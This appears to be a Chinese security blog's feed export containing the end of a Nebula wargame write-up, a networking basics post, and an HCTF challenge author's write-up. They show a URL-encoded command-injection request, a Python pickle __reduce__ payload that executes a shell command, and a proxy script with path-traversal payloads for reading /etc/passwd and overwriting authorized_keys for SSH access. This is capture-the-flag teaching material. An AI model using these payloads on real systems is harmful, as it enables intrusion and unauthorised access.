<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">level16@nebula:/tmp$ vim GET</span><br><span class="line">#!/bin/sh</span><br><span class="line">getflag &gt; /tmp/flag</span><br><span class="line">:wq</span><br><span class="line">level16@nebula:/tmp$ export PATH=/tmp:$PATH</span><br><span class="line">level16@nebula:/tmp$ GET</span><br><span class="line">level16@nebula:/tmp$ cat /tmp/flag </span><br><span class="line">getflag is executing on a non-flag account, this doesn't count</span><br><span class="line"><span class="header">level16@nebula:/tmp$ rm /tmp/flag </span><br><span class="line">------------------</span></span><br><span class="line"><span class="header">$    curl nebula:1616/index.cgi?username=%60%2f%2a%2fget%60                         </span><br><span class="line">------------------</span></span><br><span class="line">level16@nebula:/tmp$ cat /tmp/flag </span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h1 id="Level17">Level17</h1><p>( ′ロ` )终于遇到我会的语言了。。。python代码审计<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import <span class="tag">time</span></span><br><span class="line">import socket</span><br><span class="line">import signal</span><br><span class="line"></span><br><span class="line">signal.<span class="function"><span class="title">signal</span><span class="params">(signal.SIGCHLD, signal.SIG_IGN)</span></span></span><br><span class="line"></span><br><span class="line">def <span class="function"><span class="title">server</span><span class="params">(skt)</span></span>:</span><br><span class="line">  line = skt.<span class="function"><span class="title">recv</span><span class="params">(<span class="number">1024</span>)</span></span></span><br><span class="line"></span><br><span class="line">  obj = pickle.<span class="function"><span class="title">loads</span><span class="params">(line)</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> <span class="tag">i</span> <span class="keyword">in</span> obj:</span><br><span class="line">      clnt.<span class="function"><span class="title">send</span><span class="params">(<span class="string">"why did you send me "</span> + i + <span class="string">"?\n"</span>)</span></span></span><br><span class="line"></span><br><span class="line">skt = socket.<span class="function"><span class="title">socket</span><span class="params">(socket.AF_INET, socket.SOCK_STREAM, <span class="number">0</span>)</span></span></span><br><span class="line">skt.<span class="function"><span class="title">bind</span><span class="params">((<span class="string">'0.0.0.0'</span>, <span class="number">10007</span>)</span></span>)</span><br><span class="line">skt.<span class="function"><span class="title">listen</span><span class="params">(<span class="number">10</span>)</span></span></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">  clnt, addr = skt.<span class="function"><span class="title">accept</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">if</span><span class="params">(os.fork()</span></span> == <span class="number">0</span>):</span><br><span class="line">      clnt.<span class="function"><span class="title">send</span><span class="params">(<span class="string">"Accepted connection from %s:%d"</span> % (addr[<span class="number">0</span>], addr[<span class="number">1</span>])</span></span>)</span><br><span class="line">      <span class="function"><span class="title">server</span><span class="params">(clnt)</span></span></span><br><span class="line">      <span class="function"><span class="title">exit</span><span class="params">(<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<p>详情参加官方文档 [<a href="https://docs.python.org/2/library/pickle.html" target="_blank" rel="external">https://docs.python.org/2/library/pickle.html</a>]</p>
<p>问题出来pickle模块的loads方法，在如果dumps了一个object类型数据，则在loads时会执行其中的<strong>reduce</strong>方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># level16.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ttt</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">return</span> (os.system,(<span class="string">"getflag&gt;/tmp/flag16"</span>,))</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">a = pickle.dumps(ttt())</span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line"><span class="comment">#b = pickle.loads(a)</span></span><br></pre></td></tr></table></figure>
<p>可以自己在本地测试一下。。我的修炼还是不够啊。。<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level16<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>python level16.py &gt; nc <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">10007</span></span><br><span class="line"><span class="constant">Accepted </span>connection from <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="symbol">:</span><span class="number">59058</span>^<span class="constant">C</span></span><br><span class="line">level16<span class="variable">@nebula</span><span class="symbol">:/tmp</span><span class="variable">$ </span>cat flag16</span><br><span class="line"><span class="constant">You </span>have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure></p>
<p>底层系统的水太深了。。。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>这份writeup可能水分很大，因为第一次玩这类的题目，所以一边看别人的writeup一边玩才玩的出来，不过还会有自己的总结。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="PWN" scheme="http://0x48.pw/tags/PWN/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[12.19网络方向培训]]></title>
    <link href="http://0x48.pw/2015/12/19/0x0E/"/>
    <id>http://0x48.pw/2015/12/19/0x0E/</id>
    <published>2015-12-19T02:36:07.000Z</published>
    <updated>2016-03-28T10:21:26.590Z</updated>
    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-isa.png" alt="ISA"></p>
<a id="more"></a>
<h1 id="OSI七层模型(Open_System_Interconnect_开放系统互连参考模型)">OSI七层模型(Open System Interconnect 开放系统互连参考模型)</h1><p>国际标准化组织(ISO)和国际电报电话咨询委员会(CCITT)联合制定的开放系统互连参考模型</p>
<p><img src="/img/osi.jpg" alt="osi"></p>
<h1 id="TCP/IP_协议族">TCP/IP 协议族</h1><p><img src="/img/TCPIP.png" alt="TCP/IP"></p>
<h2 id="协议">协议</h2><p>协议族</p>
<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-pro.png" alt="协议族"></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">import <span class="keyword">socket</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">s</span> = <span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET, <span class="keyword">socket</span>.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">add = (<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="keyword">s</span>.<span class="keyword">bind</span>(add)</span><br><span class="line"><span class="keyword">s</span>.<span class="keyword">listen</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">	conn, addr = <span class="keyword">s</span>.<span class="keyword">accept</span>();</span><br><span class="line">	<span class="keyword">print</span> addr</span><br><span class="line">	buf = conn.<span class="keyword">recv</span>(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">print</span> buf</span><br><span class="line">	conn.sendall(<span class="string">"HTTP/1.1 200 OK\n\r\n\n"</span>)</span><br><span class="line">	conn.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>
<h2 id="端口">端口</h2><p>大小：16bits  (0-65535)</p>
<p>保留端口号：0-1024</p>
<p>默认端口:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">21</span>     <span class="keyword">ftp</span></span><br><span class="line"><span class="number">22</span>     ssh</span><br><span class="line"><span class="number">23</span>     telnet</span><br><span class="line"><span class="number">80</span>     <span class="keyword">http</span></span><br><span class="line"><span class="number">443</span>   <span class="keyword">https</span></span><br><span class="line"><span class="number">3306</span> mysql</span><br></pre></td></tr></table></figure></p>
<h2 id="IPv4">IPv4</h2><p>大小: 32bits (0.0.0.0-255.255.255.255)</p>
<p>子网掩码： 把IP分为网络地址和主机地址</p>
<p>特殊地址：</p>
<p>1.整个子网，主机地址全为0</p>
<p>2.子网广播地址，主机地址全为1的地址</p>
<p>3.三段内网地址<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10<span class="class">.0</span><span class="class">.0</span><span class="class">.0-10</span><span class="class">.255</span><span class="class">.255</span><span class="class">.255</span></span><br><span class="line">172<span class="class">.16</span><span class="class">.0</span><span class="class">.0-172</span><span class="class">.31</span><span class="class">.255</span><span class="class">.255</span></span><br><span class="line">192<span class="class">.168</span><span class="class">.0</span><span class="class">.0-192</span><span class="class">.168</span><span class="class">.255</span><span class="class">.255</span></span><br></pre></td></tr></table></figure></p>
<p>4.环回地址 <code>127.0.0.1 - 127.255.255.255</code></p>
<p>5.本机地址 <code>0.0.0.0</code></p>
<p>6.广播地址 <code>255.255.255.255</code><br>公网地址全球唯一</p>
<h2 id="MAC（Media_Access_Control）地址">MAC（Media Access Control）地址</h2><p>大小：48bits (00:00:00:00:00:00-FF:FF:FF:FF:FF:FF)</p>
<p>网卡出产时写死在硬件中。相当于网卡的身份证，具有全球唯一性</p>
<h1 id="浏览器访问HTTP服务详解">浏览器访问HTTP服务详解</h1><h3 id="DNS（Domain_Name_System，域名系统）">DNS（Domain Name System，域名系统）</h3><pre><code>域名  &lt;--&gt;  <span class="type">IP</span>地址
</code></pre><h2 id="应用层">应用层</h2><p>封装HTTP包</p>
<h2 id="传输层">传输层</h2><ul>
<li>TCP</li>
<li>UDP</li>
</ul>
<p>封装TCP包</p>
<h2 id="网络层">网络层</h2><p>封装IP包</p>
<h2 id="数据链路层">数据链路层</h2><p>封装MAC包</p>
<h2 id="物理层">物理层</h2><p>转换成二进制，通过网卡，网线进行数据传输</p>
<p>数据发送过去后，然后反过来解封</p>
<h2 id="安全问题">安全问题</h2><h3 id="arp">arp</h3><h3 id="SYN">SYN</h3><h3 id="DNS">DNS</h3>]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-isa.png" alt="ISA"></p>]]>
    
    </summary>
    
      <category term="网络" scheme="http://0x48.pw/tags/%E7%BD%91%E7%BB%9C/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[HCTF之Black-Eat-Black总结]]></title>
    <link href="http://0x48.pw/2015/12/08/0x0D/"/>
    <id>http://0x48.pw/2015/12/08/0x0D/</id>
    <published>2015-12-08T06:49:13.000Z</published>
    <updated>2016-03-28T10:21:37.214Z</updated>
    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-hctf.png" alt="HCTF"></p>
<a id="more"></a>
<p>这次HCTF，我负责黑吃黑这题的出题和运维，最终只有六星一个队日穿了该题。</p>
<hr>
<p><strong>题目名称</strong>：Black eat black(300不足，200有余)<br><strong>题目描述</strong>：使用该DNS(180.153.47.182)后，你会被劫持哦～<br><strong>分值</strong>：300<br><strong>开题金币</strong>：300<br><strong>奖励金币</strong>：400</p>
<hr>
<h2 id="writeup">writeup</h2><p>先给出writeup脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># writeup.py</span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> BaseConverter</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyanyConverter</span><span class="params">(BaseConverter)</span>:</span></span><br><span class="line">	weight = <span class="number">200</span></span><br><span class="line">	regex = <span class="string">'.*'</span></span><br><span class="line">	</span><br><span class="line">app = Flask(__name__, static_folder = <span class="string">"nononono"</span>)</span><br><span class="line">app.url_map.converters[<span class="string">'myany'</span>] = MyanyConverter</span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/&lt;myany:url&gt;', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(url)</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"---------------------------------------------------"</span></span><br><span class="line">	req_url = <span class="string">"http://120.55.181.136/"</span>+url</span><br><span class="line">	<span class="comment"># req_url = "http://120.55.181.136/username/uploadfile/....//....//....//....//....//....//....//etc/passwd"</span></span><br><span class="line">	<span class="keyword">print</span> req_url</span><br><span class="line">	header = &#123;&#125;</span><br><span class="line">	data = &#123;&#125;</span><br><span class="line">	my_file = &#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> request.headers:</span><br><span class="line">		<span class="keyword">if</span> x[<span class="number">1</span>] == <span class="string">''</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> x[<span class="number">0</span>] == <span class="string">'Host'</span>:</span><br><span class="line">                	header[<span class="string">'Host'</span>] = <span class="string">"127.0.0.1:4444"</span></span><br><span class="line">                	<span class="comment"># header['Host'] = "127.0.0.1:4444/username/uploadfile/../../../../../../etc/passwd"</span></span><br><span class="line">                	<span class="keyword">continue</span></span><br><span class="line">		header[x[<span class="number">0</span>]] = x[<span class="number">1</span>]</span><br><span class="line">	<span class="comment">#print header</span></span><br><span class="line">	<span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">		<span class="keyword">for</span> a, b <span class="keyword">in</span> request.form.items():</span><br><span class="line">			data[a] = b</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> request.files <span class="keyword">and</span> len(request.files) == <span class="number">1</span>:</span><br><span class="line">			te = request.files</span><br><span class="line">			fie = te.keys()[<span class="number">0</span>]</span><br><span class="line">			f = request.files[fie]</span><br><span class="line">			set_name = <span class="string">'cache/file/'</span> + f.filename.replace(<span class="string">'/'</span>, <span class="string">''</span>).replace(<span class="string">'.'</span>, <span class="string">''</span>)</span><br><span class="line">			f.save(set_name)</span><br><span class="line">			<span class="comment">#my_file = &#123;fie: (f.filename, open(set_name, 'rb'))&#125;</span></span><br><span class="line">			my_file = &#123;fie: (f.filename, open(set_name, <span class="string">'rb'</span>))&#125;</span><br><span class="line">		<span class="keyword">if</span> my_file == &#123;&#125;:</span><br><span class="line">			req = requests.post(req_url, headers = header, data = data)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			header.pop(<span class="string">'Content-Type'</span>)</span><br><span class="line">			req = requests.post(req_url, headers = header, data = data, files = my_file)</span><br><span class="line">	<span class="keyword">elif</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">		req = requests.get(req_url, headers = header)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'404'</span></span><br><span class="line">	h = &#123;&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> x, y <span class="keyword">in</span> req.headers.items():</span><br><span class="line">		h[x] = y</span><br><span class="line">	<span class="comment">#print h</span></span><br><span class="line">	<span class="comment">#print req.content</span></span><br><span class="line">	response = Response(req.content, req.status_code, h)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"---------------------------------------------------"</span></span><br><span class="line">	<span class="comment">#return ""</span></span><br><span class="line">	<span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	app.run(debug = <span class="keyword">True</span>, port = <span class="number">8888</span>, host = <span class="string">'127.0.0.1'</span>, threaded=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
<p>通过该脚本可以自由访问到gayhub，然后修改host或者url，可以任意文件读取(见脚本里的注释)，读到 <code>/etc/passwd</code> 得到 <code>hctf2015:x:1000:1000::/home/hctf2015:/usr/bin/whereisflag</code><br>由于 <code>/usr/bin/whereisflag</code> 不可读，则判断是要通过登陆触发该脚本，接下来就通过上传文件进行任意文件覆盖，上传自己的 <code>id_rsa.pub</code>, 然后文件名设置为 <code>../../../../../../../../home/hctf2015/authorized_keys</code> 则可通过ssh远程登陆。</p>
<p>正常情况下这样就getshell，可以结束了，但是为了增加题目的趣(keng)味(die)性，和并不让选手真正getshell，所以我把 <code>/bin/bash</code> 改成了 <code>/usr/bin/whereisflag</code></p>
<p>六星撸出来的时候， whereisflag脚本是一个 B站答题系统，我从网上随便找了100多题，然后随机出13题作为填空题，无时间限制，一旦答错，将要重新开始，看在六星凌晨3点多还在做我的答题系统，还一直答不对的情况下(其实是被队友打了)，我把题目减成了2题，然后六星的成功得到flag去睡觉了，而我还要盯着服务器…- -！</p>
<p>然后我觉得答题挺坑的（迫于队友压力），把答题的彩蛋换了，至于是啥，还没人见过，你们自己去看看吧，比B站答题简单多了。。。。</p>
<p>writeup就到这了，接下来是出题思路….</p>
<hr>
<h2 id="出题思路">出题思路</h2><p>最开始我的题只是一个 gayhub，分值我觉得不到200吧，然后服务端是 Nginx + Uwsgi + flask，但是发现Nginx竟然会吃 <code>../</code>(uwsgi也会，后面会说) ,这样就没法实任意文件读取了，如果少了任意文件，我觉得基本没人会想到上传 <code>authorized_keys</code> ，那么这题就变脑洞题了。</p>
<p>但是如果不配上 Nginx + Uwsgi ,然后题目描述直接把Gayhub暴露出来，我怕光flask负担不起各大赛棍的蹂躏。</p>
<p>在一次月黑风高夜夜，灵光一闪，有了现在的黑吃黑。</p>
<p>我用自己的服务器搭了一个dns服务器(怕被菊苣们日，所有服务都光了，只剩53和把ssh端口隐藏了)，把所有的域名都指向了我的题目服务器。之后就是模拟DNS劫持，题目的服务器我写了一个flask作为中间人，负责劫持的你http，然后原封不动的进行转发。 </p>
<p>通过 <code>url = &#39;http://&#39; + host + &#39;/&#39; + path ( + query)</code> 这样的形式获取你要访问的网站，然后原封不动的获取的你headers 和 data，服务器进行请求，然后原封不动的返回。</p>
<p>然后 Gayhub 监听127.0.0.1:4444</p>
<p>这题的架构差不多就是这样。</p>
<hr>
<h2 id="Other">Other</h2><p>现在的web题，除非是有啥黑魔法，或者能像P神那样出一道神一样的代码审计题，其他的我都觉得没啥意思，而我手中没有关于php的黑魔法，也出不了有意思的代码审计的题目，所以就想着另辟奇径，而最近flask用多了，就准备用它出一道web题，然后搜到了P神在wooyun发的python 的Tornado框架的任意文件读取，这个也可以在flask里复现，不过光读取也没意思，然后灵光一闪，想到了authorized_keys的没密码登陆。。。就这样gayhub诞生了，而这题的中心思想就是不需要任何过滤的Python Web，不过仍然还是有许多问题。</p>
<ul>
<li>不配上Nginx + uwsgi受不住全国各大赛棍的蹂躏啊</li>
<li>flask框架是没漏洞的，这两个漏洞都是我人为的。。。也不是很好</li>
<li>普通用户写文件默认权限是664，而authorized_keys要是644 或者 600 或者 640, 后两个不现实，但是在root权限下，默认就是644，不过肯定不能让root用户getshell，所以只能修改问题，把普通用户 umask 002。</li>
</ul>
<p>不过之后加上DNS劫持就完美了，Gayhub放内网，剧情是未完成，因为未完成所以放内网，因为未完成所以只有登陆和传文件，因为未完成所以未做任何过滤。</p>
<p>所以该题的剧情就是，一个黑客对你进行了DNS劫持，你是被他劫持呢？还是找到他的漏洞进行反击？ 所以有了黑吃黑的题目</p>
<p>仍然有问题：</p>
<ul>
<li>只能对http进行劫持，不过我后来想到了方法把所有https换成http返回，然后记录下来，等如果请求的url等于https列表里的，则以https请求，返回数据。不过来不及，没完成。。。。。</li>
<li>redrain大神告知，该服务有个漏洞，可以通过该代理作为跳板去攻击或者dos他人，比如请求一个很大的图片，请求后就把连接断开，这样我的服务器去请求了那张大图片，而这图片却无法返回给攻击者，也就是可以用我服务的流量去攻击他人。 不过在目前情况下不现实，首先有云盾，其次。。特么我一天24小时盯着服务器呢。。我可以ban ip。。。。不过在真实情况下的确是一种攻击思路。。。。解决办法就是做缓存吧，上面说的https的时候就想做了。。。不过也是时间原因。没来得及。。</li>
<li>还有。。。。仍然挂nginx失败，同样会导致任意文件读取失败。。。但是这时候研究除了flask本身自带多线程，比赛第一天都是直接开flask，多线程跑的，不过还是怕负载太大挂了，第二天研究出了只挂uwsgi，成功，。。。。但是发现uwsgi也会吃 ../ （还好第二天没有人姿势是对的。。要不就坑人了），所以只能是80端口的代理服务挂载uwsgi，最后证明我是多虑了，，，我不用盯着服务器，ban人ip，在这种金币开题的赛制下，最后才31个队左右开了我的题，31个队中只有4个队发现了我的gayhub，10个队找上了我题目的服务器，所以说，根本没有压力。。。。。</li>
<li><p>当host是请求本机80的时候，会无限死循环，，，，特么，，这个最蛋疼。。看下面代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">"120.55.181.136"</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> request.host == <span class="string">'127.0.0.1'</span> <span class="keyword">or</span> request.host == <span class="string">'0.0.0.0'</span> <span class="keyword">or</span> <span class="string">'127.0.0.1:80'</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> <span class="string">'0.0.0.0:80'</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> <span class="string">"10.117.9.191"</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> <span class="string">'iZ23l4savztZ'</span> <span class="keyword">in</span> request.host <span class="keyword">or</span> request.host ==<span class="string">'localhost'</span> <span class="keyword">or</span> <span class="string">'localhost:80'</span> <span class="keyword">in</span> request.host:</span><br><span class="line">		request.host = <span class="string">'www.baidu.com'</span></span><br><span class="line">		</span><br><span class="line"><span class="comment">#各大赛棍一边日，我一边加。。。根本加不完，，，特么，，这确实是我考虑不周到，出现的非预期。。因为临时改，所以坑爹的写了我有生以来最长的一行代码了。。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>还是端口的问题，提示的有点勉强，如果是监听本地127.0.0.1端口，nmap是扫描不到的，不会显示filtered，按道理是要自己去扫出来，如果是监听0.0.0.0端口，然后iptables再设置下，会显示为filetered，不过却不符合实际。。最后为了降低难度(降低服务器负载)，所以我把端口绑定到扫描出来为filtered状态的4444端口….</p>
</li>
</ul>
<hr>
<h2 id="总结">总结</h2><p>第一次出题，有很多不足，比如当时有想过把文件写权限给去了，可是最终忘了静态文件了，被六星的改了我的css和js，，心累。。。</p>
<p>也出现了很多非预期，基本是我盯着服务器日志，一发现非预期就停了服务去修改。。写了几次自动化脚本。。反而带来了更多问题。。。</p>
<p>还有因为flask没有gzip模块，所以返回头里还要把gzip这个给去了。。要不然浏览器打不开网页。</p>
<p>还有一个最烦的错误了，至今没解决<br><code>ConnectionError: (&#39;Connection aborted.&#39;, error(104, &#39;Connection reset by peer&#39;))</code><br>我分析应该是阿里云的锅，当爆这个错误时，我会收一个RST包，也就是在TCP三次握手之后，HTTP请求包发送之后，服务器返回了一个TCP的RST包，所以socket端口。。报错。。GG</p>
<h3 id="服务器搭建(centos)：">服务器搭建(centos)：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">yum install libxslt-devel.x86_64</span><br><span class="line">yum install libxml2-devel.x86_64</span><br><span class="line">ln <span class="operator">-s</span> /usr/include/libxml2/libxml/ /usr/include/libxml</span><br><span class="line">yum install python-pip</span><br><span class="line">yum install python-devel.x86_64</span><br><span class="line">yum install gcc</span><br><span class="line">pip install lxml</span><br><span class="line">[</span><br><span class="line">requests</span><br><span class="line">这会出一个SSL的问题。。哎。。</span><br><span class="line">yum install libffi-devel.x86_64</span><br><span class="line">yum install openssl-devel.x86_64</span><br><span class="line">pip install requests[security]</span><br><span class="line">]</span><br><span class="line">pip install uwsgi</span><br><span class="line">[</span><br><span class="line">yum install freetype-devel</span><br><span class="line">yum install libpng-devel</span><br><span class="line">yum install libjpeg-devel</span><br><span class="line">pip install PIL --allow-external PIL --allow-unverified PIL</span><br><span class="line">]</span><br><span class="line">wget http://nginx.org/packages/centos/<span class="number">7</span>/noarch/RPMS/nginx-release-centos-<span class="number">7</span>-<span class="number">0</span>.el7.ngx.noarch.rpm  </span><br><span class="line">rpm -ivh nginx-release-centos-<span class="number">7</span>-<span class="number">0</span>.el7.ngx.noarch.rpm</span><br><span class="line"></span><br><span class="line">(依赖问题真烦！)</span><br></pre></td></tr></table></figure>
